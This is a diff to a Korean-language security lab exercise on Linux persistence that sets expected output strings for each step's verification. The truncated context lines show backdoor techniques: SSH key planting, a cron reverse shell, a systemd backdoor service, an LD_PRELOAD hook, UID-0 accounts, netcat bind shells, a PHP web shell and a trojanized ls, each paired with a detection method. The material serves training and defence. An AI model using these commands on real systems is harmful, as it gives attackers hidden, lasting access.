@@ -28,7 +28,7 @@ steps:
     비밀번호 변경과 무관하게 접속이 가능하다. 탐지를 위해 authorized_keys를 정기적으로 감사해야 한다.
   verify:
     type: output_contains
-    expect: null
+    expect: backdoor successful
     field: stdout
   target_vm: attacker
   script: 'ssh-keygen -t ed25519 -f /tmp/backdoor_key -N '''' -q && ssh ccc@10.20.30.80
@@ -52,7 +52,7 @@ steps:
     탐지: crontab -l로 모든 사용자의 cron을 정기 검사한다.'
   verify:
     type: output_contains
-    expect: null
+    expect: Cron backdoor payload
     field: stdout
   target_vm: attacker
   script: echo '# Cron-based reverse shell persistence' && echo '*/5 * * * * /bin/bash
@@ -97,7 +97,7 @@ steps:
     재시작된다. 합법적인 서비스명으로 위장하면 발견이 어렵다. 탐지: systemctl list-unit-files에서 비정상 서비스를 검사한다.'
   verify:
     type: output_contains
-    expect: null
+    expect: Systemd backdoor
     field: stdout
   target_vm: attacker
   script: 'cat > /tmp/backdoor.service << ''EOF''
@@ -142,7 +142,7 @@ steps:
     눈치채지 못한다. 탐지: .bashrc/.profile의 변경 이력을 FIM(File Integrity Monitoring)으로 감시한다.'
   verify:
     type: output_contains
-    expect: null
+    expect: 'Payload:'
     field: stdout
   target_vm: attacker
   script: echo '# .bashrc persistence payload (simulation only)' && echo 'echo "nohup
@@ -163,7 +163,7 @@ steps:
     /var/tmp 등 tmpfs 디렉토리가 자주 사용된다. 탐지: find로 숨겨진 파일/디렉토리를 정기 검색한다.'
   verify:
     type: output_contains
-    expect: null
+    expect: update.sh
     field: stdout
   target_vm: attacker
   script: ssh ccc@10.20.30.80 'mkdir -p /tmp/.hidden_backdoor && echo "#!/bin/bash"
@@ -184,7 +184,7 @@ steps:
     커스텀 PAM 모듈을 삽입하는 방식이다. 매우 은밀하지만 패키지 무결성 검사(debsums)로 탐지할 수 있다.
   verify:
     type: output_contains
-    expect: null
+    expect: pam
     field: stdout
   target_vm: attacker
   script: ssh ccc@10.20.30.80 'cat /etc/pam.d/sshd 2>/dev/null; echo ---; cat /etc/pam.d/common-auth
@@ -206,7 +206,7 @@ steps:
     등록하면 모든 프로세스에 적용된다. 탐지: /etc/ld.so.preload 파일 감시, ldd로 라이브러리 확인.'
   verify:
     type: output_contains
-    expect: null
+    expect: LD_PRELOAD hook
     field: stdout
   target_vm: attacker
   script: "echo '#include <stdio.h>\n#include <unistd.h>\n__attribute__((constructor))\
@@ -230,7 +230,7 @@ steps:
     백도어의 강력한 징후이다. 탐지: awk -F: ''$3==0'' /etc/passwd로 UID 0 계정을 정기 검사한다.'
   verify:
     type: output_contains
-    expect: null
+    expect: Detection
     field: stdout
   target_vm: attacker
   script: 'echo ''# Backdoor user account (simulation)'' && echo ''Method 1: useradd
@@ -254,7 +254,7 @@ steps:
     인바운드를 차단하면 사용할 수 없어 리버스 셸이 선호된다.
   verify:
     type: output_contains
-    expect: null
+    expect: Bind Shell Backdoors
     field: stdout
   target_vm: attacker
   script: 'echo ''=== Bind Shell Backdoors ==='' && echo ''Netcat: nohup nc -lvnp
@@ -279,7 +279,7 @@ steps:
     통해 배치된다. 탐지: FIM, 웹 루트의 최근 수정 파일 검색, WAF 규칙.'
   verify:
     type: output_contains
-    expect: null
+    expect: Web Shell Examples
     field: stdout
   target_vm: attacker
   script: 'echo ''=== Web Shell Examples ==='' && echo ''PHP: <?php system(\$_GET["cmd"]);
@@ -302,7 +302,7 @@ steps:
     있다. 공격자는 여러 시간대에 분산하여 at 작업을 예약한다.
   verify:
     type: output_contains
-    expect: null
+    expect: '---'
     field: stdout
   target_vm: attacker
   script: 'echo ''echo backdoor_executed > /tmp/at_test'' | at now + 1 minute 2>/dev/null;
@@ -323,7 +323,7 @@ steps:
     경로 설정 등으로 지속적 접근을 확보할 수 있다. 탐지: FIM으로 sshd_config 변경 감시.'
   verify:
     type: output_contains
-    expect: null
+    expect: '---'
     field: stdout
   target_vm: attacker
   script: ssh ccc@10.20.30.80 'grep -E "(PermitRootLogin|PasswordAuthentication|AuthorizedKeysFile|Port)"
@@ -349,7 +349,7 @@ steps:
     숨긴다. 탐지: 패키지 무결성 검사(debsums, rpm -Va), AIDE/OSSEC의 FIM.'
   verify:
     type: output_contains
-    expect: null
+    expect: Detection
     field: stdout
   target_vm: attacker
   script: 'echo ''#!/bin/bash'' > /tmp/trojan_ls.sh && echo ''# Trojanized ls - hides
@@ -377,7 +377,7 @@ steps:
     도구(OSSEC, Wazuh FIM)와 수동 검사를 병행하는 것이 효과적이다.
   verify:
     type: output_contains
-    expect: null
+    expect: Persistence Hunt
     field: stdout
   target_vm: attacker
   script: ssh ccc@10.20.30.80 'echo "=== Persistence Hunt ==="; echo "[SSH Keys]";
@@ -406,7 +406,7 @@ steps:
     커버리지 갭을 분석할 수 있다. 보고서에 탐지 방법과 함께 제시하면 방어팀에 실질적인 가치를 제공한다.
   verify:
     type: output_contains
-    expect: null
+    expect: Persistence Report
     field: stdout
   target_vm: attacker
   script: 'echo -e ''=== Persistence Report ===\n\n[Techniques Used]\n1. SSH Authorized
